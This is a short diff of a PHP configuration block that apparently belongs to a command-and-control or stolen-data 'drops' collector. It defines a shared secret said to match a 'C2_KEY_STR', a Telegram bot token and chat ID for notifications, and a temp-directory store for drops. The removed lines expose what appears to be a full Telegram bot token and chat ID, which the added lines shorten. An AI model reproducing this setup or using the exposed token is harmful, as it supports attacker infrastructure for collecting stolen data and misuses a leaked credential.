@@ -2,8 +2,8 @@
 declare(strict_types=1);
 
 $SECRET = getenv('SECRET') ?: 'CHANGE_ME_9f3a1c7b2d';   // must equal C2_KEY_STR
-$BOT    = getenv('BOT')    ?: '9121116193:AAGu2w4wpUFkWufsl6wAT0QL3nhABUFc-0A';
-$CHAT   = getenv('CHAT')   ?: '6003299359';
+$BOT    = getenv('BOT')    ?: '9121116193:AAGu2w4wpA';
+$CHAT   = getenv('CHAT')   ?: '609359';
 
 $STORE = getenv('STORE') ?: (sys_get_temp_dir() . '/drops');
 
